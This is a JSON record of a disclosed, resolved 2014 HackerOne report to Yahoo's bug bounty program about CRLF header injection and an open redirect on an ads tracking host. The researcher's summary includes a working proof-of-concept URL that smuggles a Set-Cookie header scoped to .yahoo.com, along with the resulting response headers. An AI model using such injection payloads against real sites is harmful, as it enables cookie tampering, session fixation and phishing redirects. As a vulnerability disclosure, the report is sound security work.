{"id":6322,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzIy","url":"https://hackerone.com/reports/6322","title":"Header injection on rmaitrack.ads.vip.bf1.yahoo.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-04-07T20:15:01.479Z","submitted_at":"2014-04-07T20:15:01.479Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"redshark1802","url":"/redshark1802","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/538/032d1bb5577195a464c0c446919601207f50ed5a_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19,"url":"https://hackerone.com/verizonmedia","handle":"verizonmedia","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/019/0376827ddfc63924843165255c8d07e237fd3ae4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/019/0376827ddfc63924843165255c8d07e237fd3ae4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Verizon Media","twitter_handle":"verizonmedia","website":"https://www.verizonmedia.com","about":"Build Brands Members Love"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-07-31T15:54:24.273Z","bug_reporter_agreed_on_going_public_at":"2014-06-27T22:50:40.466Z","team_member_agreed_on_going_public_at":"2014-07-31T15:54:23.724Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-07-27T22:50:41.198Z","allow_singular_disclosure_after":-202722056.8212296,"singular_disclosure_allowed":true,"vote_count":13,"voters":["mygf","povargek","catferq","cuso4","circuit","eveeez","sudi","cr4xerbik4sh","japz","smokescreen","and 3 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":25796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2014-04-07T20:20:04.800Z","updated_at":"2014-04-07T20:20:04.800Z","actor":{"username":"redshark1802","cleared":false,"url":"/redshark1802","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/538/032d1bb5577195a464c0c446919601207f50ed5a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":50073,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-13T17:28:36.535Z","updated_at":"2014-05-13T17:28:36.535Z","actor":{"username":"mattbryant","cleared":false,"url":"/mattbryant","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/834/66ddcf271e0f37cb7e4a04b9a7a48e561286e8e6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":61331,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-29T17:51:07.380Z","updated_at":"2014-05-29T17:51:07.380Z","actor":{"username":"mattbryant","cleared":false,"url":"/mattbryant","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/834/66ddcf271e0f37cb7e4a04b9a7a48e561286e8e6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"redshark1802","url":"/redshark1802"},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":61483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-29T20:28:48.947Z","updated_at":"2014-05-29T20:28:48.947Z","actor":{"username":"redshark1802","cleared":false,"url":"/redshark1802","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/538/032d1bb5577195a464c0c446919601207f50ed5a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":71143,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2014-06-10T18:48:55.410Z","updated_at":"2014-06-10T18:48:55.410Z","actor":{"username":"mattbryant","cleared":false,"url":"/mattbryant","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/834/66ddcf271e0f37cb7e4a04b9a7a48e561286e8e6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":71183,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2014-06-10T19:16:02.488Z","updated_at":"2014-06-10T19:16:02.488Z","actor":{"username":"mattbryant","cleared":false,"url":"/mattbryant","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/834/66ddcf271e0f37cb7e4a04b9a7a48e561286e8e6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":78903,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2014-06-25T15:34:30.785Z","updated_at":"2014-06-25T15:34:30.785Z","actor":{"username":"redshark1802","cleared":false,"url":"/redshark1802","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/538/032d1bb5577195a464c0c446919601207f50ed5a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":80307,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2014-06-27T22:49:31.288Z","updated_at":"2014-06-27T22:49:31.288Z","actor":{"url":"/verizonmedia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/019/0376827ddfc63924843165255c8d07e237fd3ae4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Verizon Media"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"verizonmedia","collaborator":{"username":"redshark1802","url":"/redshark1802"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":80308,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-06-27T22:50:40.507Z","updated_at":"2014-06-27T22:50:40.507Z","first_to_agree":true,"actor":{"username":"redshark1802","cleared":false,"url":"/redshark1802","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/538/032d1bb5577195a464c0c446919601207f50ed5a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":98173,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-30T11:42:28.269Z","updated_at":"2014-07-30T11:42:28.269Z","actor":{"username":"redshark1802","cleared":false,"url":"/redshark1802","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/538/032d1bb5577195a464c0c446919601207f50ed5a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":98687,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-31T15:54:23.741Z","updated_at":"2014-07-31T15:54:23.741Z","actor":{"username":"junot","cleared":false,"url":"/junot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/M5pzVfGfQwf2ibThc1LRahdB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":98688,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-31T15:54:24.290Z","updated_at":"2014-07-31T15:54:24.290Z","actor":{"username":"junot","cleared":false,"url":"/junot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/M5pzVfGfQwf2ibThc1LRahdB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"verizonmedia","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":560,"category":"team","content":"Thank you for your submission to the Yahoo Bug Bounty program. We were able to reproduce the issue you reported and have implemented appropriate fixes. We appreciate your adherence to responsible disclosure guidelines and look forward to your future participation in the program.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThank you for your submission to the Yahoo Bug Bounty program. We were able to reproduce the issue you reported and have implemented appropriate fixes. We appreciate your adherence to responsible disclosure guidelines and look forward to your future participation in the program.\u003c/p\u003e\n"},{"id":13192,"category":"researcher","content":"header injection on rmaitrack.ads.vip.bf1.yahoo.com\n\nThe vulnerable URI is http://rmaitrack.ads.vip.bf1.yahoo.com/re/cox,demos%2Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl,C%3D00_test,P%3D0_test,A%3D0_test,L%3D0_test/0/0/tc,c%3Anoscript/, everything after the last slash is reflected in the Location-header. The control-characters %0D%0A are translated to new lines in the response-header. \nThis makes it also possible to overwrite or inject cookies scoped to .yahoo.com.\nFurthermore, since an attacker can control the location of the redirect, this is also an open redirect.\n\nPOC (redirects to example.com and sets the cookie evil with the value 1):\nhttp://rmaitrack.ads.vip.bf1.yahoo.com/re/cox,demos%2Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl,C%3D00_test,P%3D0_test,A%3D0_test,L%3D0_test/0/0/tc,c%3Anoscript/example.com%0D%0ASet-Cookie%3a%20evil%3d1%3b%20expires%3dSun%2c%206%20Apr%202015%2011%3a57%3a53%20GMT%3b%20domain%3d.yahoo.com%3b%20path%3d%2f\n\nResponse-Header:\n```\nHTTP/1.1 302 Found\nDate: Mon, 07 Apr 2014 20:14:20 GMT\nP3P: policyref=\"http://info.yahoo.com/w3c/p3p.xml\", CP=\"CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC GOV\"\nSet-Cookie: adxid=0150e85343071cd2; expires=Thu, 31 Dec 2015 00:00:00 GMT; domain=.adinterax.com; path=/\nSet-Cookie: adxnoc=1; expires=Mon, 7 Apr 2014 21:14:20 GMT; domain=.adinterax.com; path=/\nLocation: http://example.com\nSet-Cookie: evil=1; expires=Sun, 6 Apr 2015 11:57:53 GMT; domain=.yahoo.com; path=/\nContent-Length: 04\nConnection: close\nContent-Type: text/plain; charset=utf-8\nCache-Control: private\n```\n\nThe open redirect was reported 7 months prior to my report but header injection wasn't noticed.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eheader injection on rmaitrack.ads.vip.bf1.yahoo.com\u003c/p\u003e\n\n\u003cp\u003eThe vulnerable URI is \u003ca title=\"http://rmaitrack.ads.vip.bf1.yahoo.com/re/cox,demos%2Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl,C%3D00_test,P%3D0_test,A%3D0_test,L%3D0_test/0/0/tc,c%3Anoscript/\" href=\"/redirect?url=http%3A%2F%2Frmaitrack.ads.vip.bf1.yahoo.com%2Fre%2Fcox%2Cdemos%252Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl%2CC%253D00_test%2CP%253D0_test%2CA%253D0_test%2CL%253D0_test%2F0%2F0%2Ftc%2Cc%253Anoscript%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://rmaitrack.ads.vip.bf1.yahoo.com/re/cox,demos%2Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl,C%3D00_test,P%3D0_test,A%3D0_test,L%3D0_test/0/0/tc,c%3Anoscript/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, everything after the last slash is reflected in the Location-header. The control-characters %0D%0A are translated to new lines in the response-header. \u003cbr\u003e\nThis makes it also possible to overwrite or inject cookies scoped to .yahoo.com.\u003cbr\u003e\nFurthermore, since an attacker can control the location of the redirect, this is also an open redirect.\u003c/p\u003e\n\n\u003cp\u003ePOC (redirects to example.com and sets the cookie evil with the value 1):\u003cbr\u003e\n\u003ca title=\"http://rmaitrack.ads.vip.bf1.yahoo.com/re/cox,demos%2Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl,C%3D00_test,P%3D0_test,A%3D0_test,L%3D0_test/0/0/tc,c%3Anoscript/example.com%0D%0ASet-Cookie%3a%20evil%3d1%3b%20expires%3dSun%2c%206%20Apr%202015%2011%3a57%3a53%20GMT%3b%20domain%3d.yahoo.com%3b%20path%3d%2f\" href=\"/redirect?url=http%3A%2F%2Frmaitrack.ads.vip.bf1.yahoo.com%2Fre%2Fcox%2Cdemos%252Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl%2CC%253D00_test%2CP%253D0_test%2CA%253D0_test%2CL%253D0_test%2F0%2F0%2Ftc%2Cc%253Anoscript%2Fexample.com%250D%250ASet-Cookie%253a%2520evil%253d1%253b%2520expires%253dSun%252c%25206%2520Apr%25202015%252011%253a57%253a53%2520GMT%253b%2520domain%253d.yahoo.com%253b%2520path%253d%252f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://rmaitrack.ads.vip.bf1.yahoo.com/re/cox,demos%2Fz_demo_tWFTV_12513_osc_tornado_alley_playing_300x250_vid_fl,C%3D00_test,P%3D0_test,A%3D0_test,L%3D0_test/0/0/tc,c%3Anoscript/example.com%0D%0ASet-Cookie%3a%20evil%3d1%3b%20expires%3dSun%2c%206%20Apr%202015%2011%3a57%3a53%20GMT%3b%20domain%3d.yahoo.com%3b%20path%3d%2f\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eResponse-Header:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nDate: Mon, 07 Apr 2014 20:14:20 GMT\nP3P: policyref=\u0026quot;http://info.yahoo.com/w3c/p3p.xml\u0026quot;, CP=\u0026quot;CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC GOV\u0026quot;\nSet-Cookie: adxid=0150e85343071cd2; expires=Thu, 31 Dec 2015 00:00:00 GMT; domain=.adinterax.com; path=/\nSet-Cookie: adxnoc=1; expires=Mon, 7 Apr 2014 21:14:20 GMT; domain=.adinterax.com; path=/\nLocation: http://example.com\nSet-Cookie: evil=1; expires=Sun, 6 Apr 2015 11:57:53 GMT; domain=.yahoo.com; path=/\nContent-Length: 04\nConnection: close\nContent-Type: text/plain; charset=utf-8\nCache-Control: private\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe open redirect was reported 7 months prior to my report but header injection wasn\u0026#39;t noticed.\u003c/p\u003e\n"}]}